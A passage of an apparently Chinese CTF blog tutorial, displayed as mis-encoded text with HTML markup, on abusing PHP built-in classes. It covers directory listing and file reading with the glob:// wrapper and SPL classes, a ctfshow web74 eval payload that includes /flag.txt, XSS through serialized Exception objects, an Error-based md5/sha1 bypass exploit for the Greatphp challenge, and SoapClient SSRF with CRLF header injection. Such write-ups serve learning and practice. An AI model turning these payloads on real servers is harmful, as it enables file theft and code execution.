class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br><span class="hljs-variable">$dir</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">FilesystemIterator</span>(<span class="hljs-variable">$dir</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202311151629412.png" alt="image-20230624173320866"></p><p>è¿™ä¸ªä¼šæ˜¾ç¤ºä½ ä¸Šä¸€çº§çš„åå­—</p><p>è¿™ä¸¤ä¸ªç±»åŒæ ·ä¹Ÿæœ‰ä¸€å¥è¯å½¢å¼payloadï¼š</p><p>DirectoryIterator:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);&#125;<br></code></pre></td></tr></table></figure><p>FilesystemIterator:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">FilesystemIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);&#125;<br></code></pre></td></tr></table></figure><p>ä¸‹é¢çœ‹ä¸€ä¸‹ctfshowçš„web74</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();<br>        <span class="hljs-title function_ invoke__">ob_end_clean</span>();<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-variable">$s</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå½“ä¸­ç”±äº<code>error_reporting(0);</code><br><code>ini_set(&#39;display_errors&#39;, 0);</code>  </p><p>è¿™ä¸¤è¡Œä»£ç ç¦ç”¨äº†phpé”™è¯¯æŠ¥å‘Šï¼Œå¹¶ä¸”ç¦æ­¢åœ¨æµè§ˆå™¨ä¸­æ˜¾ç¤ºé”™è¯¯ä¿¡æ¯ï¼Œè¿™æ„å‘³ç€ï¼Œæ²¡æ³•çœ‹åˆ°æ‰§è¡Œç»“æœ</p><p>æ‰€ä»¥å¯ä»¥ç”¨åˆ°glod:///æ¥è¿›è¡Œä¸€ä¸ªè¯»å–æ–‡ä»¶å</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);&#125;<span class="hljs-keyword">exit</span>();<br></code></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥çœ‹åˆ°æ–‡ä»¶åï¼Œæœ€åæ–‡ä»¶åŒ…å«ä½ æƒ³è¦çš„æ–‡ä»¶å³å¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<span class="hljs-keyword">exit</span>();<br></code></pre></td></tr></table></figure><p>å‡è®¾flag.txtæ˜¯åœ¨æ ¹ç›®å½•çš„</p><h3 id="GlobIterator"><a href="#GlobIterator" class="headerlink" title="GlobIterator"></a>GlobIterator</h3><p>(PHP 5 &gt;= 5.3.0, PHP 7, PHP 8)</p><p>è¿™ä¸ªæ˜¯FilesystemIteratorçš„å­ç±»  ç„¶åä¹Ÿå¯ä»¥å»è¯»å–æ–‡ä»¶å ä½†æ˜¯å®ƒçš„è¡Œä¸ºå’Œglob()å·®ä¸å¤šï¼Œæ‰€ä»¥åœ¨ä¼ å‚çš„æ—¶å€™å°±ä¸éœ€è¦ç”¨globä¼ªåè®®äº†</p><p>ä¸‹é¢æ˜¯è¿™ä¸ªä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$dir</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">GlobIterator</span>(<span class="hljs-variable">$dir</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<br><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202311151629890.png" alt="image-20230624201553453"></p><p>ä¹Ÿæ˜¯ç»å¯¹è·¯å¾„</p><p><strong>ä¸‹é¢å°±æ˜¯è¯»å–æ–‡ä»¶å†…å®¹çš„ç±»äº†</strong></p><h3 id="SPIFileInfo"><a href="#SPIFileInfo" class="headerlink" title="SPIFileInfo"></a>SPIFileInfo</h3><p>(PHP 5 &gt;= 5.1.2, PHP 7, PHP 8)</p><p>SPIFileInfoç±»ä¸ºå•ä¸ªæ–‡ä»¶çš„ä¿¡æ¯æä¾›äº†é«˜çº§çš„é¢å‘å¯¹è±¡æ¥å£</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br><span class="hljs-variable">$context</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$context</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<br><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202311151630756.png" alt="image-20230624210000481"></p><p>å¦‚æœå‡ºç°ä»¥ä¸‹ç±»ä¼¼çš„ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"> </span>&#123;<br>       <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>($<span class="hljs-title">this</span>-&gt;<span class="hljs-title">data</span>);</span><br><span class="hljs-class">   &#125;</span><br><span class="hljs-class">è¿™ä¸ª<span class="hljs-title">class</span>å°±æ˜¯é‚£äº›ç±»ï¼Œç„¶å<span class="hljs-title">data</span>å°±æ˜¯é‚£äº›å‘½ä»¤</span><br></code></pre></td></tr></table></figure><h2 id="2-æ„é€ xss"><a href="#2-æ„é€ xss" class="headerlink" title="2.æ„é€ xss"></a>2.æ„é€ xss</h2><p>æœ‰ä¸¤ä¸ªç±» </p><p>1.Error 2.Exception</p><p>è¿™ä¸¤ä¸ªç±»å½“ä¸­éƒ½æœ‰_toStringè¿™ä¸¤ä¸ªé­”æœ¯æ–¹æ³•</p><p>1.Error(åœ¨php7,8å¼€å¯çš„æ—¶å€™å¼€å¯æŠ¥é”™)  <strong>Error</strong> æ˜¯æ‰€æœ‰PHPå†…éƒ¨é”™è¯¯ç±»çš„åŸºç±»ã€‚</p><p>2.Exception(åœ¨php5,7,8å¼€å¯çš„æ—¶å€™å¼€å¯æŠ¥é”™)   <strong>Exception</strong>æ˜¯æ‰€æœ‰ç”¨æˆ·çº§å¼‚å¸¸çš„åŸºç±»ã€‚</p><p>é€šè¿‡echo(ä¸åªæ˜¯echo å½“å¯¹è±¡è¢«å½“æˆå­—ç¬¦ä¸²æ—¶å°±èƒ½è§¦å‘)æ¥è§¦å‘toString è¿›ä¸€æ­¥æ„é€ xss</p><p>é€šè¿‡å®˜æ–¹æ–‡æ¡£å¯ä»¥çœ‹åˆ°è¿™ä¸¤ä¸ªç±»çš„å±æ€§éƒ½ä¸€æ ·</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202311151630767.png" alt="image-20230628154427087"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202311151630782.png" alt="image-20230628154442643"></p><p>ä¸‹é¢å¯ä»¥æ¼”ç¤ºä¸€ä¸‹è¿›è¡Œxssæ„é€ </p><p>å…ˆå†™ä¸€ä¸ªç»è¿‡ååºåˆ—åŒ–åçš„ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;k&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„echoæ˜¯è§¦å‘çš„å…³é”®</p><p>ç„¶åä¸‹é¢æ˜¯æ„é€ xss</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;U_F1ind_Me&#x27;)&lt;/script&gt;&quot;</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å› ä¸ºæœ‰ä¸å¯è§å­—ç¬¦ï¼Œæ‰€ä»¥è¦urlç¼–ç ä¸€ä¸‹</p><p>éœ€è¦æ³¨æ„çš„å°±æ˜¯åªæœ‰Exceptionæ‰èƒ½åœ¨php5è¿›è¡Œä¸€ä¸ªxss</p><p>Erroråªæœ‰åœ¨7æˆ–8ä¸‹è¿›è¡Œä¸€ä¸ªxss</p><h2 id="3-ç»•è¿‡å“ˆå¸Œæ¯”è¾ƒ"><a href="#3-ç»•è¿‡å“ˆå¸Œæ¯”è¾ƒ" class="headerlink" title="3.ç»•è¿‡å“ˆå¸Œæ¯”è¾ƒ"></a>3.ç»•è¿‡å“ˆå¸Œæ¯”è¾ƒ</h2><p>è¿™ä¸ªæ˜¯åˆ©ç”¨äº†Errorçš„æŠ¥é”™ä¿¡æ¯ </p><p>å¯ä»¥ç”¨ä¸€äº›ä»£ç æ¥è¯´æ˜ä¸€ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;payload&quot;</span>,<span class="hljs-number">1</span>);<span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;payload&quot;</span>,<span class="hljs-number">2</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>===<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™ä¸ªçš„è¿è¡Œç»“æœæ˜¯:<br><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202311151630647.png" alt="image-20230628195433399" style="zoom:80%;" /></p><p>ä¸¤ä¸ªnew Errorçš„ç±»éƒ½åœ¨åŒä¸€è¡Œ æŠ¥é”™ä¿¡æ¯ä¹Ÿæ˜¯åŒä¸€è¡Œï¼Œè™½ç„¶ä¸¤ä¸ªçš„å†…å®¹ä¸ä¸€æ · ä½†æ˜¯æŠ¥é”™ä¿¡æ¯ä¸€æ · è¿™æ ·åœ¨é¢å¯¹ä¸€äº›å“ˆå¸Œæ¯”è¾ƒçš„æ—¶å€™å°±å¯ä»¥è¿›è¡Œç»•è¿‡</p><p>ä¸‹é¢æ¥ä¸€ä¸ªé¢˜ç›®çœ‹çœ‹:</p><p><strong>[æå®¢å¤§æŒ‘æˆ˜ 2020]Greatphp</strong></p><p>è¿›å…¥åæŸ¥çœ‹ä¸€ä¸‹ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$syc</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lover</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;syc != <span class="hljs-variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;syc) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;syc)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;lover)) )&#123;<br>           <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="hljs-variable">$this</span>-&gt;syc, <span class="hljs-variable">$match</span>))&#123;<br>               <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;syc);<br>           &#125; <span class="hljs-keyword">else</span> &#123;<br>               <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Try Hard !!&quot;</span>);<br>           &#125;<br>           <br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;great&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;great&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬è¦åšçš„å°±æ˜¯æ‰§è¡Œevalå‘½ä»¤</p><p>è¿™ä¸ªå‰æå°±æ˜¯  if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) )  å…ˆæ»¡è¶³è¿™ä¸ªifè¯­å¥ è¿™ä¸ªæˆ‘ä»¬ä¹‹å‰åšçš„MD5ç¢°æ’å°±ä¸èƒ½ç”¨äº† å¯ä»¥ç”¨ErroræŠ¥é”™ä¿¡æ¯è¿›è¡Œä¸€ä¸ªå“ˆå¸Œç»•è¿‡</p><p>å°±æ˜¯è®©ä¸¤ä¸ªErrorè¯­å¥åœ¨åŒä¸€è¡Œ ç„¶åå’Œä¹‹å‰çš„æ²¡ä»€ä¹ˆåŒºåˆ«äº†</p><p>è¿™ä¸ªæœ‰ä¸€ä¸ªæ­£åˆ™åŒ¹é… è¿‡æ»¤äº†å°æ‹¬å·å’ŒåŒå¼•å· æˆ‘ä»¬ç”¨å–åè¿›è¡Œä¸€ä¸ªç»•è¿‡</p><p><code>$str=&quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;&quot;;</code></p><p>ä¸»è¦çš„å°±æ˜¯ä¸Šé¢çš„é‚£ä¸ª</p><p>æœ€ç»ˆæ„é€ ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$syc</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lover</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;syc != <span class="hljs-variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;syc) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;syc)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;lover)) )&#123;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="hljs-variable">$this</span>-&gt;syc, <span class="hljs-variable">$match</span>))&#123;<br>                <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;syc);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Try Hard !!&quot;</span>);<br>            &#125;<br><br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$str</span>=<span class="hljs-string">&quot;?&gt;&lt;?=include~&quot;</span>.<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&quot;%D0%99%93%9E%98&quot;</span>).<span class="hljs-string">&quot;?&gt;&quot;</span>;<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">SYCLOVER</span>();<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-variable">$str</span>,<span class="hljs-number">1</span>);<span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-variable">$str</span>,<span class="hljs-number">2</span>);<br><span class="hljs-variable">$c</span>-&gt;syc=<span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$c</span>-&gt;lover=<span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$c</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="4-SSRF"><a href="#4-SSRF" class="headerlink" title="4.SSRF"></a>4.SSRF</h2><p>è¿™ä¸ªå’ŒSoapClientè¿™ä¸ªç±»æœ‰å…³</p><p>è¿™ä¸ªç±»é‡Œé¢æœ‰ä¸€ä¸ªcallé­”æœ¯æ–¹æ³•  å½“è°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶è¢«è°ƒç”¨</p><p>æ³¨æ„è¦å¼€å¯soapé€‰é¡¹ å¦åˆ™ä¸ä¼šç›‘å¬æˆåŠŸ</p><p>PHPçš„å†…ç½®ç±»SoaPClientæ˜¯ä¸€ä¸ªä¸“é—¨ç”¨æ¥è®¿é—®webæœåŠ¡çš„ç±»ï¼Œå¯ä»¥æä¾›ä¸€ä¸ªåŸºäºSOAPåè®®è®¿é—®webæœåŠ¡çš„phpå®¢æˆ·ç«¯ã€‚</p><p>å‡½æ•°çš„å½¢å¼å¦‚ä¸‹ï¼š</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">public</span> SoapClient <span class="hljs-type">:: SoapClient</span>(mixed $wsdl <span class="hljs-meta">[</span>ï¼Œ<span class="hljs-built_in">array</span> $options <span class="hljs-meta">]</span>)<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæŒ‡æ˜æ˜¯å¦ä¸ºwsdlæ¨¡å¼ï¼Œä¸ºnullåˆ™ä¸ºéwsdlæ¨¡å¼</p><p>wsdlå°±æ˜¯ä¸€ä¸ªxmlæ ¼å¼çš„æ–‡æ¡£ï¼Œç”¨äºæè¿°web serverçš„å®šä¹‰</p><p>ç¬¬äºŒä¸ªå‚æ•°ä¸ºarray,wsdlæ¨¡å¼ä¸‹å¯é€‰ï¼›éwsdlæ¨¡å¼ä¸‹ï¼Œéœ€è¦è®¾ç½®locationå’Œuriï¼Œlocationå°±æ˜¯å‘é€çš„soapæœåŠ¡å™¨çš„urlï¼Œuriæ˜¯æœåŠ¡çš„å‘½åç©ºé—´</p><p>ä¸‹é¢å¯ä»¥çœ‹ä¸€ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$target</span> = <span class="hljs-string">&#x27;http://192.168.122.136:2022/&#x27;</span>;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span>=&gt;<span class="hljs-variable">$target</span>,<span class="hljs-string">&#x27;user_agent&#x27;</span>=&gt;<span class="hljs-string">&quot;qaq\r\nCookie: PHPSESSID=wangluoanquanqaq1213&quot;</span>,<span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;test&#x27;</span>));<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$c</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$c</span>-&gt;<span class="hljs-title function_ invoke__">a</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202311151630388.png" alt="image-20230629151043313"></p><p>è¿™ä¸ªsoapactionçš„å†…å®¹æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„</p><p>å…¶å®ä¹Ÿå°±æ˜¯uriçš„å†…å®¹</p><p>ç„¶åè¿™é‡Œçš„è¯å¯ä»¥ä¸CRLFè¿›è¡Œä¸€ä¸ªç»“åˆ è¿›è¡ŒCRLFæ”»å‡»(å°±æ˜¯åˆ©ç”¨äº†\r\n)</p><p>å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« :<a 